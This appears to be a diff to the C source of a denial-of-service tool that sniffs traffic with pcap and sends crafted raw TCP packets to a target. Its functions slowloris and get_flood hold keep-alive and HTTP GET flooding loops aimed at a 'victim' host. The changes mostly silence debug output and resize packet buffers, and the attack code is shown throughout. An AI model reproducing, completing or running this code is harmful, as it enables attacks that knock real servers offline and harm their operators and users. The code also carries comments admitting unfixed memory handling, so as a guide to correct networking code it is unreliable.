@@ -52,7 +52,7 @@ void start_sniffing(char *argv[])
         //sizeof ethernet header is 14
         //length = 14;
         //int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
-        printf("Entering pcap loop.\n");
+        //printf("Entering pcap loop.\n");
         if(pcap_loop(descr, -1, (void *) packet_receive, (u_char *) argv) < 0)
         {
             perror("Cannot get raw packet.\n");
@@ -66,8 +66,8 @@ void start_sniffing(char *argv[])
 void packet_process(struct attack_params *packet)
 {
 
-    printf("Test\n");
-    printf("Received packet to/from specified host!\n");
+    //printf("Test\n");
+    //printf("Received packet to/from specified host!\n");
     struct ip *ip;
     struct tcphdr *tcp;
     //u_char *ptr;
@@ -99,13 +99,16 @@ int packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, u_char *pac
     struct attack_params *packet1;
     packet1 = (struct attack_params *) malloc(sizeof(struct attack_params));
 
-    printf("Arguments for request are: %s and %s\n", argv[2], argv[1]);
+
+    //I should probably do a malloc here as well for members of struct attack_params... ------------------------------------------------------------------------------------
+
+    //printf("Arguments for request are: %s and %s\n", argv[2], argv[1]);
     packet1->args[0] = argv[0];
     packet1->args[1] = argv[1];
     packet1->args[2] = argv[2];
     packet1->a_packet = packet;
 
-    printf("Arguments for request are: %s and %s\n", packet1->args[2], packet1->args[1]);
+    //printf("Arguments for request are: %s and %s\n", packet1->args[2], packet1->args[1]);
     pthread_t thread1;
 
     ////Creating thread with start_sniffing() function call, will start receiving packets and process them
@@ -117,65 +120,30 @@ int packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, u_char *pac
     pthread_detach(thread1);
     return 0;
 
-    //printf("Received packet to/from specified host!\n");
-    //struct ip *ip;
-    //struct tcphdr *tcp;
-    ////u_char *ptr;
-
-    //ip = (struct ip *)(packet + sizeof(struct ether_header));
-    ////printf("Size of ether_header is: %d\n", sizeof(struct ether_header));
-    //tcp = (struct tcphdr *)(packet + SIZE_ETHERNET + (IP_HL(ip)*4));
-
-
-    ////printf("%d\n", l1_len);
-    //    //& is a binary AND
-    ////if(tcp->th_flags & TH_SYN)
-    ////    printf("Packet has a flags set as SYN!\n");
-    ////if(tcp->th_flags & TH_ACK)
-    ////    printf("Packet has a flags set as ACK!\n");
-    ////if(tcp->th_flags & TH_RST)
-    ////    printf("Packet has a flags set as RST!\n");
-    ////if(tcp->th_flags & TH_FIN)
-    ////    printf("Packet has a flags set as FIN!\n");
-    ////if(tcp->th_flags & TH_PUSH)
-    ////    printf("Packet has a flags set as PUSH!\n");
-    //if((tcp->th_flags & TH_SYN) && (tcp->th_flags & TH_ACK)) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
-    //{
-    //    printf("---------------------------\n");
-    //    printf("GOT SYN/ACK PACKET!\n");
-    //    printf("---------------------------\n");
-    //    printf("Packet with src IP: %s\n", inet_ntoa(ip->ip_src));
-    //    printf("Packet with dst IP: %s\n", inet_ntoa(ip->ip_dst));
-    //    printf("Packet's seq: %u\n", ntohl(tcp->th_seq));
-    //    printf("Packet's ack: %u\n", ntohl(tcp->th_ack));
-
-    //    u_int32_t seq_n = ntohl(tcp->th_seq);
-    //    u_int32_t ack_n = ntohl(tcp->th_ack);
-    //    //printf("Sequence num is: %u\n", seq_n);
-    //    send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, argv);
-    //}
 }
 
 void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
 {
-    printf("SEND ACK request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
+    //printf("SEND ACK request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
     struct ip iph;
     struct tcphdr tcph;
     struct sockaddr_in dest;
 
     int sock_raw;
+    int pkt_size;
 
     sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 
+    pkt_size = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr);
     char *pkt_syn_ack;
-    pkt_syn_ack = (char *) malloc(60);
+    pkt_syn_ack = (char *) malloc(pkt_size);
     if(pkt_syn_ack == NULL)
     {
         perror("Could not allocate pkt_syn_ack mem on heap.\n");
         exit(-1);
     }
 
-
+    bzero(pkt_syn_ack, pkt_size);
     iph.ip_hl = 5;
     iph.ip_v = 4;
     iph.ip_tos = 0;
@@ -232,20 +200,25 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
 
 void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
 {
-    printf("Arguments for GET request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
+    //printf("Arguments for GET request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
     struct ip iph;
     struct tcphdr tcph;
     struct sockaddr_in dest;
 
+    //int pkt_data_size;
+    //char *pkt_msg;
+    //sprintf(pkt_msg, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n", argv[2], argv[1]);
+    //pkt_data_size = strlen(pkt_msg);
     //printf("Victim: %s\n", argv[1]);
     char *pkt_data;
-    pkt_data = (char *) malloc(60);
+    pkt_data = (char *) malloc(512);
     if(pkt_data == NULL)
     {
         perror("Could not allocate pkt_data mem on heap.\n");
         exit(-1);
     }
 
+    bzero(pkt_data, 512);
     uint8_t *packet;
     packet = malloc(sizeof(u_int8_t));
     if(packet == NULL)
@@ -334,6 +307,7 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
             perror("Failed to send keepalive packet!\n");
             exit(1);
         }
+        //free(pkt_data);
         sleep(10);
 
     }
@@ -349,15 +323,15 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     struct tcphdr tcph;
     struct sockaddr_in dest;
 
-    printf("Victim: %s\n", argv[1]);
     char *pkt_data;
-    pkt_data = (char *) malloc(60);
+    pkt_data = (char *) malloc(512);
     if(pkt_data == NULL)
     {
         perror("Could not allocate pkt_data mem on heap.\n");
         exit(-1);
     }
 
+    bzero(pkt_data, 512);
 
     uint8_t *packet;
     packet = malloc(sizeof(u_int8_t));
